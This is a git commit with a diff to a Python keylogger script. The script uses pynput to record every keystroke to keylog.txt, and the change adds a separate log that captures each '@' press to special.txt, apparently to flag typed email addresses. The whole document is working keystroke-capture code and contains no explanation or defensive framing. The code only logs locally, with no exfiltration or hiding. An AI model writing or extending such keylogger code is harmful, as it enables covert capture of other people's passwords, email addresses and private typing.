0df512d2cabbeed35b29b415a1e741bed148eac5
Frank Su <fsu134@gmail.com>
2022-03-18 00:33:29 +1100

    change to keylogger to detect '@' special character

--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,43 @@
 from pynput.keyboard import Key, Listener
 import logging
  
+
+
+
+
+def setup_logger(name, log_file, level=logging.INFO):
+    """To setup as many loggers as you want"""
+
+    formatter = logging.Formatter(" %(asctime)s - %(message)s")
+
+    handler = logging.FileHandler(log_file)        
+    handler.setFormatter(formatter)
+
+    logger = logging.getLogger(name)
+    logger.setLevel(level)
+    logger.addHandler(handler)
+
+    return logger
+
+
+
+
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
- 
+
+
+speciallogger = setup_logger('specialcharacterlogger', 'special.txt')
+
+
 def on_press(key):
+
+    print(str(key))
+    if(str(key) == "'@'"):
+        print("SUCESS")
+        speciallogger.info(str(key))
+
     logging.info(str(key))
  
 with Listener(on_press=on_press) as listener :
     listener.join()
+
+
